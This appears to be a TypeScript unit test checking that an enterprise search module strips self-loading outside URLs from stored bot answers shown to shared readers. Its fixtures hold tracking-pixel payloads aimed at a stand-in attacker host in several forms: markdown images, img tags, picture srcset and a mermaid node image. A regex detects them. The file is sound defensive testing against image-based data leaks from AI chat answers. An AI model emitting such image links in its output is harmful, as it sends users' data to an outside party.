import { expect } from 'chai'
import {
  attachMessages,
  buildConversationResponse,
} from '../../../../src/modules/enterprise_search/utils/utils'

const PIXEL = 'https://attacker.example/p.gif?d=CNRY_R'
const live = (body: unknown): string[] =>
  [...JSON.stringify(body).matchAll(/(?:srcset=|src=|\]\(|img: )\\?"?(?:https?:)?\/\/attacker\.example[^"\\)]*/g)].map((m) => m[0])

const session = { _id: 's1', orgId: 'o1', userId: 'u1', initiator: 'u1', title: 't', sharedWith: [] }
const rows = () => [
  { _id: 'q1', messageType: 'user_query', content: 'question' },
  {
    _id: 'a1',
    messageType: 'bot_response',
    content: `![x](${PIXEL}) <img src="${PIXEL}">\n\n\`\`\`mermaid\nflowchart TD\n  A@{ img: "https://attacker.example/i.png" }\n\`\`\``,
    parts: [{ type: 'text', content: `<picture><source srcset="${PIXEL}"></picture>` }],
  },
  { _id: 'e1', messageType: 'error', content: `![e](${PIXEL})` },
]

describe('answer text on the shared read paths', () => {
  it('attachMessages gives every reader answers without outside URLs that load on their own', () => {
    const out = attachMessages(session, rows(), 'u2')
    expect(out.messages).to.have.length(3)
    expect(live(out.messages)).to.deep.equal([])
    expect(out.messages[0].content).to.equal('question')
  })

  it('buildConversationResponse does the same for the detail body', () => {
    const out = buildConversationResponse(
      session as never,
      'u1',
      { page: 1, limit: 20, skip: 0, totalMessages: 3, hasNextPage: false, hasPrevPage: false },
      rows() as never,
    )
    expect(live(out.messages)).to.deep.equal([])
  })
})
